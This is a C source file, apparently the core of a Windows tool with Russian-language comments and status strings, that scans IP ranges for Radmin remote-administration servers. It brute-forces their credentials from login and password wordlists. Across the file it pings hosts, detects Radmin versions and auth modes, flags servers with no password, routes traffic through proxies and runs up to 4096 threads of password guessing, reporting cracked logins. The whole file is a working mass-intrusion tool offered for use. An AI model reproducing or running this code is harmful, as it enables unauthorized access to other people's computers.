/* -------------------------------------------------------------------------- */

#include "scanner.h"

/* -------------------------------------------------------------------------- */

int minpasslen_2 = 8;
int minpasslen_3 = 6;

char *def_username = "admin";
char *def_password = "12345678";

/* -------------------------------------------------------------------------- */

/*
 * put word into dictionary
 */

int wordlist_insert(scanner_wordlist *wordlist, char *item)
{
	int capacity_tmp;
	char **items_tmp;

	if(wordlist)
	{
		//increase dictionary capacity, if not enough one
		if(wordlist->length == wordlist->capacity)
		{
			capacity_tmp = wordlist->capacity + 32;
			if(!(items_tmp = realloc(wordlist->items, 
				capacity_tmp * sizeof(char*))))
			{
				return 0;
			}
			wordlist->capacity = capacity_tmp;
			wordlist->items = items_tmp;
		}

		//insert word to dictionary
		if(!(wordlist->items[wordlist->length] = strdup(item)))
			return 0;

		wordlist->length++;

		return 1;
	}
	
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * create dictionary based on file
 */

scanner_wordlist *wordlist_load(char *filename)
{
	scanner_wordlist *wordlist = NULL;
	FILE *f;
	char str[384], *temp;

	//open file
	if((f = fopen(filename, "rt")))
	{
		//initalize dictionary storage
		if((wordlist = malloc(sizeof(scanner_wordlist))))
		{
			wordlist->capacity = 0;
			wordlist->length = 0;
			wordlist->items = NULL;

			//read dictionary file
			while(fgets(str, sizeof(str), f))
			{
				//remove endline characters, if any
				if((temp = strpbrk(str, "\r\n")))
					*temp = 0;

				//insert word to dictionary
				if(strlen(str) > 0)
					wordlist_insert(wordlist, str);

			}

			//close file
			fclose(f);
		}
	}

	return wordlist;
}

/* -------------------------------------------------------------------------- */

/*
 * free dictionary
 */

void wordlist_free(scanner_wordlist *wordlist)
{
	int i;
	if(wordlist)
	{
		for(i = 0; i < wordlist->length; ++i)
			free(wordlist->items[i]);
		free(wordlist->items);
		free(wordlist);
	}
}

/* -------------------------------------------------------------------------- */

/*
 * update progress bar, if position altered
 */

void on_progress_change(scanner_t *cx, int force)
{
	float scanned, unscanned;
	int progress;

	if(cx->started)
	{
		if(cx->callbacks->on_progress)
		{
			//count scanned and unscanned items count
			scanned = (float)(cx->ranges->down->size) +
				(float)(cx->ranges->up->size) +
				(float)(cx->ranges->warn->size);
			unscanned = (float)(cx->ranges->queue->size);

			//calculate progress bar position
			progress = 0;
			if(scanned + unscanned > 0)
				progress = (int)(scanned * 1000.0f / (scanned + unscanned));

			//if position altered, update it on screen
			if( (progress != cx->progress) || 
				(force) )
			{
				cx->callbacks->on_progress(
					cx->callbacks->on_progress_param,
					progress,
					cx->threadcount,
					cx->enabled,
					cx->paused);
				cx->progress = progress;
			}
		}
	}
}

/* -------------------------------------------------------------------------- */

/*
 * thread start handler
 */

void on_thread_start(scanner_t *cx, int *id)
{
	WaitForSingleObject(cx->statmutex, INFINITE);
	*id = cx->threadcount++;
	on_progress_change(cx, 1);
	ReleaseMutex(cx->statmutex);
}

/* -------------------------------------------------------------------------- */

/*
 * thread exit handler
 */

void on_thread_end(scanner_t *cx)
{
	WaitForSingleObject(cx->statmutex, INFINITE);
	
	cx->threadcount--;
	on_progress_change(cx, 1);

	//if last thread exited
	if(cx->threadcount == 0)
	{
		//update engine status
		cx->enabled = 0;
		cx->paused = 0;

		//fool-evasion
		if(cx->started)
		{

			//play sound
			if(cx->props->enable_sounds)
			{
				PlaySound(MAKEINTRESOURCE(IDR_WAVE_DONE), 
					cx->props->instance, 
					SND_RESOURCE|SND_ASYNC);
			}
			
			//call scan-finish handler
			cx->started = 0;
			if(cx->callbacks->on_finish)
			{
				cx->callbacks->on_finish(
					cx->callbacks->on_finish_param);
			}

			//free resources
			CloseHandle(cx->pingsemaphore);
			wordlist_free(cx->logins);
			wordlist_free(cx->passwords);
			cx->logins = NULL;
			cx->passwords = NULL;
			free(cx->portlist);
			cx->portlist = NULL;
		}
	}
	
	ReleaseMutex(cx->statmutex);
}

/* -------------------------------------------------------------------------- */

/*
 * scan loop
 */

DWORD WINAPI ScannerThread(scanner_t *cx)
{
	int i, id, alive, count, rtt, port;
	int user, pass;
	int curr, total;
	int auth;
	int err;
	char *version;
	char *authtext;
	char *lastvalidlogin;
	unsigned int ip;
	int status;
	char pingresult[32];
	char buff[32];
	int itemid;
	int error_count = 0;
	tcp_open_struc connaddr;
	scanned_host_status hoststat;
	
	on_thread_start(cx, &id);
	
	Sleep(100);//let all threads to spawn
	
	while(cx->enabled)
	{
		if(cx->paused)
		{
			Sleep(100);
		}
		else
		{
			//select host to scan
			if(cx->props->random_scan_order)
			{
				ip = range_get_random(cx->ranges->queue, 1);
			}
			else
			{
				ip = range_get_first(cx->ranges->queue, 1);
			}

			//if no hosts left, leave scan loop
			if(!ip)
			{
				break;
			}

			//clear error flag
			err = 0;

			//ping host
			alive = 1;
			strcpy(pingresult, "N/A");
			if(cx->props->ping_enable)
			{
				alive = 0;
				
				count = cx->props->ping_packet_count;
				if(count < 1) count = 1;
				if(count > 256) count = 256;

				if(WaitForSingleObject(cx->pingsemaphore, INFINITE) == WAIT_OBJECT_0)
				{
					rtt = cx->props->ping_timeout;
					if((alive = ping(ip, &rtt, &err, count)))
						itoa(rtt, pingresult, 10);
					ReleaseSemaphore(cx->pingsemaphore, 1, NULL);
				}
			}

			//work with host
			if(alive)
			{

				//walk arround port list
				for(i = 0; i < cx->numports; ++i)
				{

					//setup connection info
					port = cx->portlist[i];
					connaddr.proxy_type = cx->props->proxy_type;
					connaddr.proxy_host = cx->props->proxy_host;
					connaddr.proxy_port = cx->props->proxy_port;
					connaddr.proxy_username = cx->props->proxy_username;
					connaddr.proxy_password = cx->props->proxy_password;
					connaddr.host = ip;
					connaddr.port = port;

					//try connect server
					if(radmin_check_version(&connaddr, &version, &auth, cx->props->tcp_timeout))
					{

						//fill host info
						authtext = "N/A";
						switch(auth)
						{
						case RADMIN_AUTH_NATIVE_2:
						case RADMIN_AUTH_NATIVE_3:
							authtext = "пар.";
							break;
						case RADMIN_AUTH_NTLM_2:
						case RADMIN_AUTH_NTLM_3:
							authtext = "nt";
							break;
						case RADMIN_AUTH_NONE_2:
						case RADMIN_AUTH_NONE_3:
							authtext = "нет";
							break;
						}

						hoststat.success = 1;
						hoststat.status = "";
						hoststat.client = version;
						hoststat.host = ip;
						hoststat.port = port;
						hoststat.ping = pingresult;
						hoststat.mechanism = authtext;
						hoststat.login = "";
						hoststat.password = "";

						//new result list item
						itemid = -1;

						//wrong server type
						if( auth == RADMIN_AUTH_UNKNOWN )
						{
							hoststat.success = 0;
							hoststat.status = "неизв. верс.";

							if(cx->callbacks->on_status)
							{
								itemid = cx->callbacks->on_status(
									cx->callbacks->on_status_param,
									itemid,
									0,
									&hoststat);
							}
						}

						//radmin 2.x native sequence
						else if(auth == RADMIN_AUTH_NATIVE_2)
						{

							//walk arround password list
							error_count = 0;
							status = RADMIN_STATUS_PASSERR;
							for(pass = 0; pass < cx->passwords->length; ++pass)
							{
								//if password match
								if( (int)strlen(cx->passwords->items[pass]) >= minpasslen_2 )
								{
									//check scan abort
									if(!cx->enabled)
									{
										err = 1;
										break;
									}

									//update status
									if(error_count > 0)
									{
										wsprintf(buff, "подб. (%d%%) #%d", 
											pass * 100 / cx->passwords->length,
											error_count + 1);
									}
									else
									{
										wsprintf(buff, "подбор (%d%%)", 
											pass * 100 / cx->passwords->length);
									}
									hoststat.success = 0;
									hoststat.status = buff;
									hoststat.password = cx->passwords->items[pass];
									
									if(cx->callbacks->on_status)
									{
										itemid = cx->callbacks->on_status(
											cx->callbacks->on_status_param,
											itemid,
											0,
											&hoststat);
									}

									//try it
									status = radmin_auth2(&connaddr, 
										cx->passwords->items[pass],
										cx->props->tcp_timeout);

									//if system error
									if( (status == RADMIN_STATUS_ERROR) ||
										(status == RADMIN_STATUS_PROTOERR) )
									{
										error_count++;
										if(error_count >= cx->props->max_errors)
											break;
										pass--;
										for(i = 0; i < cx->props->error_delay; ++i)
										{
											if(!cx->enabled)
												break;
											Sleep(1000);
										}
									}
									else
									{
										error_count = 0;

										//if bad password, try next
										if(status != RADMIN_STATUS_PASSERR)
											break;
									}

									//idle
									Sleep(cx->props->delay_time);
								}
							}
							
							//connection failure or system error
							if(status == RADMIN_STATUS_ERROR)
							{
								hoststat.success = 0;
								hoststat.status = "разрыв соединения";
								hoststat.password = "";
								err = 1;
							}
							
							//auth sequence succeed
							else if(status == RADMIN_STATUS_SUCCESS)
							{
								hoststat.success = 1;
								hoststat.status = "подобран";
								hoststat.password = cx->passwords->items[pass];
							}

							//auth sequence failure
							else if(status == RADMIN_STATUS_PROTOERR)
							{
								hoststat.success = 0;
								hoststat.status = "неверный отклик";
								hoststat.password = "";
								err = 1;
							}

							//no one password match
							else if(status == RADMIN_STATUS_PASSERR)
							{
								hoststat.success = 0;
								hoststat.status = "не подобран";
								hoststat.password = "";
							}

							//update status
							if(cx->callbacks->on_status)
							{
								itemid = cx->callbacks->on_status(
									cx->callbacks->on_status_param,
									itemid,
									0,
									&hoststat);
							}
						}

						//radmin 3.x native sequence
						else if(auth == RADMIN_AUTH_NATIVE_3)
						{
							lastvalidlogin = NULL;
							status = RADMIN_STATUS_PASSERR;
							
							//проходим по списку логинов
							error_count = 0;
							for(user = 0; user < cx->logins->length; ++user)
							{
								//проходим по списку паролей
								for(pass = 0; pass < cx->passwords->length; ++pass)
								{
									if( (int)strlen(cx->passwords->items[pass]) >= minpasslen_3 )
									{
										//обрабатываем команду прерывания
										if(!cx->enabled)
										{
											err = 1;
											break;
										}

										//выводим прогресс
										total = cx->logins->length * cx->passwords->length;
										curr = cx->passwords->length * user + pass;
										if(error_count > 0)
										{
											wsprintf(buff, "подб. (%d%%) #%d", 
												curr * 100 / total,
												error_count + 1);
										}
										else
										{
											wsprintf(buff, "подбор (%d%%)", 
												curr * 100 / total);
										}
										hoststat.success = 0;
										hoststat.status = buff;
										hoststat.login = cx->logins->items[user];
										hoststat.password = cx->passwords->items[pass];
										if(cx->callbacks->on_status)
										{
											itemid = cx->callbacks->on_status(
												cx->callbacks->on_status_param,
												itemid,
												0,
												&hoststat);
										}

										//пробуем комбинацию логина и пароля
										status = radmin_auth3(&connaddr, 
											cx->logins->items[user],
											cx->passwords->items[pass],
											cx->props->tcp_timeout);

										//если системная ошибка
										if( (status == RADMIN_STATUS_ERROR) ||
											(status == RADMIN_STATUS_PROTOERR) ||
											(status == RADMIN_STATUS_ALGOERR) )
										{
											error_count++;
											if(error_count >= cx->props->max_errors)
												break;
											pass--;
											for(i = 0; i < cx->props->error_delay; ++i)
											{
												if(!cx->enabled)
													break;
												Sleep(1000);
											}
										}

										else
										{
											error_count = 0;

											//если ошибка - "неверный пароль", 
											//пробуем следующий пароль
											if(status != RADMIN_STATUS_PASSERR)
												break;

											//ошибка - "неверный пароль" -> логин верен,
											//запоминаем его на всякий
											lastvalidlogin = cx->logins->items[user];
										}

										Sleep(cx->props->delay_time);
									}
								}

								//если ошибка - "неверный логин" или "неверный пароль",
								//пробуем следующий логин
								if( (status != RADMIN_STATUS_NAMEERR) &&
									(status != RADMIN_STATUS_PASSERR) )
								{
									break;
								}
							}

							//network or system error
							if(status == RADMIN_STATUS_ERROR)
							{
								hoststat.success = 0;
								hoststat.status = "разрыв соединения";
								hoststat.login = "";
								hoststat.password = "";
								err = 1;
							}
							
							//auth sequence server error
							else if(status == RADMIN_STATUS_PROTOERR)
							{
								hoststat.success = 0;
								hoststat.status = "неправильный отклик";
								hoststat.login = "";
								hoststat.password = "";
								err = 1;
							}

							//auth sequence local error
							else if(status == RADMIN_STATUS_ALGOERR)
							{
								hoststat.success = 0;
								hoststat.status = "сбой авторизации";
								hoststat.login = "";
								hoststat.password = "";
								err = 1;
							}

							//no one login/password match
							else if( (status == RADMIN_STATUS_PASSERR) ||
								(status == RADMIN_STATUS_NAMEERR) )
							{
								hoststat.success = 0;
								hoststat.status = "не подобран";
								hoststat.login = "";
								hoststat.password = "";

								//выведем логин, если нашёлся валидный
								if(lastvalidlogin)
									hoststat.login = lastvalidlogin;
							}

							//auth sequence succeed
							else if(status == RADMIN_STATUS_SUCCESS)
							{
								hoststat.success = 1;
								hoststat.status = "подобран";
								hoststat.login = cx->logins->items[user];
								hoststat.password = cx->passwords->items[pass];
							}

							//update status
							if(cx->callbacks->on_status)
							{
								itemid = cx->callbacks->on_status(
									cx->callbacks->on_status_param,
									itemid,
									0,
									&hoststat);
							}
						}

						//not using auth sequence
						else if( (auth == RADMIN_AUTH_NONE_2) ||
							(auth == RADMIN_AUTH_NONE_3) )
						{
							hoststat.status = "без пароля";

							if(cx->callbacks->on_status)
							{
								itemid = cx->callbacks->on_status(
									cx->callbacks->on_status_param,
									itemid,
									0,
									&hoststat);
							}
						}

						//ohter auth sequence
						else 
						{
							hoststat.success = 0;
							hoststat.status = "не поддерж.";

							if(cx->callbacks->on_status)
							{
								itemid = cx->callbacks->on_status(
									cx->callbacks->on_status_param,
									itemid,
									0,
									&hoststat);
							}
						}

						//remove bad result, if one
						if( (!hoststat.success) &&
							(cx->props->auto_remove_bad) &&
							(cx->callbacks->on_status) )
						{
							itemid = cx->callbacks->on_status(
								cx->callbacks->on_status_param,
								itemid,
								1,
								&hoststat);
						}

						//play sound
						if( (hoststat.success) &&
							(cx->props->enable_sounds) )
						{
							PlaySound(MAKEINTRESOURCE(IDR_WAVE_GOOD), 
								cx->props->instance, 
								SND_RESOURCE|SND_ASYNC);
						}

						//update stats
						cx->result_count++;
						if(hoststat.success)
						{
							cx->result_count_good++;
						}
						if(cx->callbacks->on_result_progress)
						{
							cx->callbacks->on_result_progress(
								cx->callbacks->on_result_progress_param,
								cx->result_count,
								cx->result_count_good);
						}
					}
				}
			}

			//add host to some group
			if(err) 
			{
				range_add_single(cx->ranges->warn, ip);
			}
			else if(alive) 
			{
				range_add_single(cx->ranges->up, ip);
			}
			else 
			{
				range_add_single(cx->ranges->down, ip);
			}

			//update progress bar
			on_progress_change(cx, 0);

			//idle
			Sleep(cx->props->delay_time);
		}
	}
	on_thread_end(cx);
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * scanner start routine
 */

int scanner_start(scanner_t *cx)
{
	int i, threadcount, spawned;
	int *portlist;
	int limports, numports, port;
	char *temp, *temp2, *p;
	char buff[384];
	char curdir[MAX_PATH];
	int loaded = 1;
	HANDLE thread;

	if(cx)
	{

		//if paused, simply unpause
		if(cx->paused)
		{
			cx->paused = 0;
			on_progress_change(cx, 1);
			return 1;
		}

		//if stopped, run
		if(!cx->started)
		{

			//load dictionaries
			GetCurrentDirectory(MAX_PATH, curdir);

			GetModuleFileName(NULL, buff, MAX_PATH);
			if((p = strrchr(buff, '\\')))
				*p = 0;
			SetCurrentDirectory(buff);

			if(!(cx->logins = wordlist_load(cx->props->dict1_path)))
			{
				if(cx->callbacks->on_error)
				{
					wsprintf(buff, "Не удаётся загрузить словарь логинов \"%s\"",
						cx->props->dict1_path);
					cx->callbacks->on_error(cx->callbacks->on_error_param,
						"Ошибка", buff);
				}
				loaded = 0;
			}

			if(!(cx->passwords = wordlist_load(cx->props->dict2_path)))
			{
				if(cx->callbacks->on_error)
				{
					wsprintf(buff, "Не удаётся загрузить словарь паролей \"%s\"",
						cx->props->dict2_path);
					cx->callbacks->on_error(cx->callbacks->on_error_param,
						"Ошибка", buff);
				}
				loaded = 0;
			}

			SetCurrentDirectory(curdir);

			if(!loaded)
			{
				wordlist_free(cx->logins);
				wordlist_free(cx->passwords);
			}

			if(loaded)
			{
				//if some dictionaries is empty, give them some content
				if(!cx->logins->length)
					wordlist_insert(cx->logins, def_username);
				if(!cx->passwords->length)
					wordlist_insert(cx->passwords, def_password);

				//create semaphore for pinging
				if(cx->props->ping_max_sessions < 1) cx->props->ping_max_sessions = 1;
				if(cx->props->ping_max_sessions > 256) cx->props->ping_max_sessions = 256;
				cx->pingsemaphore = CreateSemaphore(NULL, 
					cx->props->ping_max_sessions, 
					cx->props->ping_max_sessions, 
					NULL);

				//explode port list
				numports = 0;
				limports = 0;
				portlist = NULL;

				if((temp = strdup(cx->props->port_list)))
				{
					if((p = strtok_s(temp, ";, ", &temp2)))
					{
						do {
							port = atoi(p);
							if((port >= 1) && (port <= 65535))
							{
								if(numports == limports)
								{
									limports += 10;
									portlist = realloc(portlist, sizeof(int)*limports);
								}
								if(portlist)
								{
									portlist[numports++] = port;
								}
							}
						} while((p = strtok_s(NULL, ";, ", &temp2)));
					}
					free(temp);
				}

				cx->portlist = portlist;
				cx->numports = numports;

				//update scanner status
				cx->started = 1;
				cx->enabled = 1;

				//reset result stat
				cx->result_count = 0;
				cx->result_count_good = 0;
				if(cx->callbacks->on_result_progress)
				{
					cx->callbacks->on_result_progress(
						cx->callbacks->on_result_progress_param,
						cx->result_count,
						cx->result_count_good);
				}

				//run scan loop threads
				threadcount = cx->props->max_thread_count;
				if(threadcount < 1) threadcount = 1;
				if(threadcount > 4096) threadcount = 4096;
				on_progress_change(cx, 0);

				spawned = 0;
				for(i = 0; i < threadcount; ++i)
				{
					if((thread = CreateThread(NULL, 0, ScannerThread, cx, 0, NULL)))
					{
						spawned++;
						CloseHandle(thread);
					}
				}

				//oops..
				if(!spawned)
				{
					cx->started = 0;
					cx->enabled = 0;
				}
			}

			return 1;
		}
	}
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * scanner stop
 */

int scanner_stop(scanner_t *cx)
{
	if(cx)
	{
		//simply clear enabled flag
		//running threads should exit
		if(cx->enabled)
		{
			cx->enabled = 0;
			cx->paused = 0;
			return 1;
		}
	}
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * scanner pause/unpause
 */

int scanner_pause(scanner_t *cx)
{
	if(cx)
	{
		if(cx->enabled)
		{
			cx->paused = !cx->paused;
			on_progress_change(cx, 1);
			return 1;
		}
	}
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * check scanner status
 */

int scanner_isstarted(scanner_t *cx)
{
	if(cx)
	{
		if(cx->started)
			return 1;
	}
	return 0;
}

/* -------------------------------------------------------------------------- */

/*
 * initalize scanner's context
 */

scanner_t *scanner_new(scanner_settings *props, scanner_ranges *ranges, scanner_callbacks *callbacks)
{
	scanner_t *cx;
	if((cx = malloc(sizeof(scanner_t))))
	{
		cx->props = props;
		cx->ranges = ranges;
		cx->callbacks = callbacks;
		cx->threadcount = 0;
		cx->enabled = 0;
		cx->started = 0;
		cx->paused = 0;
		cx->logins = NULL;
		cx->passwords = NULL;
		cx->portlist = NULL;
		cx->progress = 0;
		cx->threadcount = 0;
		if((cx->statmutex = CreateMutex(NULL, FALSE, NULL)))
			return cx;
		free(cx);
	}
	return NULL;
}

/* -------------------------------------------------------------------------- */

/*
 * destroy scanner's context
 */

void scanner_free(scanner_t *cx)
{
	if(cx)
	{
		CloseHandle(cx->statmutex);
		free(cx);
	}
}

/* -------------------------------------------------------------------------- */
